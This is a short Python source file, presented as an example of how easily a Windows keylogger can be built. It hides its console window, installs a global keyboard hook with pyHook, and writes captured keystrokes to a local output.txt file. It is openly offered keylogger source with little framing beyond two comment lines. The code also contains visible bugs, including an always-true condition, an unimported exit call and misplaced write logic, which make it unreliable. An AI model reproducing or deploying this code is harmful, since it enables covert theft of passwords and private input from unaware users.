# This project is used as an example on how easy some can create a windows keylogger
# This specific Keylogger is to be used on windows devices. 

import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
    #openoutput.txt or read cuurent keystrokes
        f = open('{Location of File}output.txt', 'r+')
        buffer = f.read()
        f.close()
    #open output.txt to write creent + new Keystrokes
        f = open('{Location of File}', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
            buffer += keylogs
            f.write(buffer)
            f.close()
# create a hook manager object
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
#set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
